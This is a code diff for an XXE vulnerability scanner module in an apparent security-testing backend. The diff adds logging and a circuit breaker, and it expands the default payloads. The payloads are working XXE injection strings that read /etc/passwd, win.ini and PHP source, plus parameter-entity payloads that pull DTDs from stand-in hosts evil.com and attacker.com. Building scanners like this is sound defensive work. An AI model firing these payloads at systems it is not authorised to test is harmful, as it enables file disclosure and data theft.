@@ -1,12 +1,16 @@
+# -*- coding: utf-8 -*-
 import asyncio
-import uuid
 from typing import List, Dict, Any
 import httpx
+from datetime import datetime
+from backend.utils.circuit_breaker import circuit_breaker
+from backend.utils.logging_config import get_context_logger
 
 from backend.scanners.base_scanner import BaseScanner
 from backend.scanners.scanner_registry import ScannerRegistry
-from backend.types.models import ScanInput, Finding, Severity, OwaspCategory, RequestLog
+from backend.types.models import ScanInput, Severity, OwaspCategory
 
+logger = get_context_logger(__name__)
 
 class XxeScanner(BaseScanner):
     """
@@ -21,78 +25,155 @@ class XxeScanner(BaseScanner):
         "version": "1.0"
     }
 
-    async def _perform_scan(self, target: str, options: Dict) -> List[Finding]:
+    @circuit_breaker(failure_threshold=3, recovery_timeout=30.0, name="xxe_scanner")
+    async def scan(self, scan_input: ScanInput) -> List[Dict]:
+        start_time = datetime.now()
+        scan_id = f"{self.__class__.__name__}_{start_time.strftime('%Y%m%d_%H%M%S')}"
+        try:
+            logger.info("Scan started", extra={
+                "scanner": self.__class__.__name__,
+                "scan_id": scan_id,
+                "target": scan_input.target,
+                "options": scan_input.options
+            })
+            results = await self._perform_scan(scan_input.target, scan_input.options)
+            self._update_metrics(True, start_time)
+            logger.info("Scan completed", extra={
+                "scanner": self.__class__.__name__,
+                "scan_id": scan_id,
+                "target": scan_input.target,
+                "result_count": len(results)
+            })
+            return results
+        except Exception as e:
+            self._update_metrics(False, start_time)
+            logger.error("Scan failed", extra={
+                "scanner": self.__class__.__name__,
+                "scan_id": scan_id,
+                "target": scan_input.target,
+                "error": str(e)
+            }, exc_info=True)
+            raise
+
+    async def _perform_scan(self, target: str, options: Dict) -> List[Dict]:
         """
-        Asynchronously checks for XXE vulnerabilities by sending crafted XML payloads.
-
-        Args:
-            target: The target URL for the scan.
-            options: Additional options for the scan.
-
-        Returns:
-            A list of Finding objects for detected XXE vulnerabilities.
+        Perform the actual XXE vulnerability scan.
         """
-        findings: List[Finding] = []
-        target_url = target
-        print(f"[*] Starting XXE scan for {target_url}...")
+        findings: List[Dict] = []
+        logger.info("Starting XXE scan", extra={
+            "target": target,
+            "scanner": self.__class__.__name__
+        })
 
-        # XXE payloads to test
-        xxe_payloads = [
+        xxe_payloads = options.get('payloads', [
+            # Basic file read
             """<?xml version="1.0" encoding="ISO-8859-1"?>
             <!DOCTYPE foo [
             <!ELEMENT foo ANY >
             <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
             <foo>&xxe;</foo>""",
-            
+
+            # Parameter entity
             """<?xml version="1.0" encoding="ISO-8859-1"?>
             <!DOCTYPE foo [
             <!ELEMENT foo ANY >
             <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
             %xxe;]>
-            <foo>&evil;</foo>"""
+            <foo>&evil;</foo>""",
+
+            # Out-of-band
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+            <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+            %xxe;]>
+            <foo>&send;</foo>""",
+
+            # Windows file read
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+            <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+            <foo>&xxe;</foo>""",
+
+            # PHP wrapper
+            """<?xml version="1.0" encoding="ISO-8859-1"?>
+            <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
+            <foo>&xxe;</foo>"""
+        ])
+
+        content_types = options.get('content_types', [
+            'application/xml',
+            'text/xml',
+            'application/x-www-form-urlencoded',
+            'multipart/form-data'
+        ])
+
+        indicators = [
+            'root:', '/bin/bash', '/etc/passwd', 'win.ini',
+            '<?php', '<?xml', 'DOCTYPE', 'ENTITY',
+            'SYSTEM', 'PUBLIC', 'file://', 'http://',
+            'base64', 'PD9waHA', 'PHhtbA'
         ]
 
-        async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
-            for payload in xxe_payloads:
-                try:
-                    headers = {
-                        "Content-Type": "application/xml"
-                    }
-                    response = await client.post(target_url, content=payload, headers=headers)
-                    
-                    # Check for indicators of XXE vulnerability
-                    if "root:" in response.text or "/bin/bash" in response.text:
-                        findings.append(
-                            Finding(
-                                id=str(uuid.uuid4()),
-                                vulnerability_type="XML External Entity (XXE)",
-                                description="Potential XXE vulnerability detected. The application appears to be processing external entities in XML input.",
-                                severity=Severity.HIGH,
-                                affected_url=target_url,
-                                remediation="Disable XML external entity processing in your XML parser. Use a secure XML parser configuration that prevents XXE attacks.",
-                                owasp_category=OwaspCategory.A03_INJECTION,
-                                proof={
-                                    "payload_used": payload,
-                                    "response_status": response.status_code,
-                                    "response_length": len(response.text)
-                                }
-                            )
-                        )
+        try:
+            async with httpx.AsyncClient(timeout=30) as client:
+                for content_type in content_types:
+                    headers = {"Content-Type": content_type}
 
-                except httpx.RequestError as e:
-                    print(f"Error testing XXE for {target_url}: {e}")
-                except Exception as e:
-                    print(f"An unexpected error occurred during XXE scan: {e}")
+                    for payload in xxe_payloads:
+                        try:
+                            response = await client.post(target, content=payload, headers=headers)
 
-        print(f"[*] Finished XXE scan for {target_url}.")
+                            for indicator in indicators:
+                                if indicator in response.text:
+                                    logger.info("Potential XXE vulnerability detected", extra={
+                                        "url": target,
+                                        "content_type": content_type,
+                                        "indicator": indicator,
+                                        "scanner": self.__class__.__name__
+                                    })
+                                    findings.append({
+                                        "type": "xxe_vulnerability",
+                                        "severity": Severity.HIGH,
+                                        "title": "XML External Entity (XXE) Vulnerability",
+                                        "description": "Found potential XXE vulnerability. The application appears to be processing external entities in XML input.",
+                                        "evidence": {
+                                            "url": target,
+                                            "content_type": content_type,
+                                            "payload": payload,
+                                            "indicator": indicator,
+                                            "response_snippet": response.text[:200]
+                                        },
+                                        "owasp_category": OwaspCategory.INJECTION,
+                                        "recommendation": "Disable XML external entity processing in your XML parser. Use a secure XML parser configuration that prevents XXE attacks. Consider using a whitelist of allowed XML features."
+                                    })
+                                    break
+
+                        except Exception as e:
+                            logger.warning("Error testing XXE payload", extra={
+                                "url": target,
+                                "content_type": content_type,
+                                "payload": payload[:100],
+                                "error": str(e),
+                                "scanner": self.__class__.__name__
+                            })
+                            continue
+        except Exception as e:
+            logger.error("Unexpected error during XXE scan", extra={
+                "target": target,
+                "error": str(e),
+                "scanner": self.__class__.__name__
+            }, exc_info=True)
+
+        logger.info("Finished XXE scan", extra={
+            "target": target,
+            "findings_count": len(findings),
+            "scanner": self.__class__.__name__
+        })
         return findings
 
-
 def register(scanner_registry: ScannerRegistry) -> None:
-    """
-    Register this scanner with the scanner registry.
-
-    Args:
-        scanner_registry: The scanner registry instance.
-    """
     scanner_registry.register("xxe", XxeScanner) 
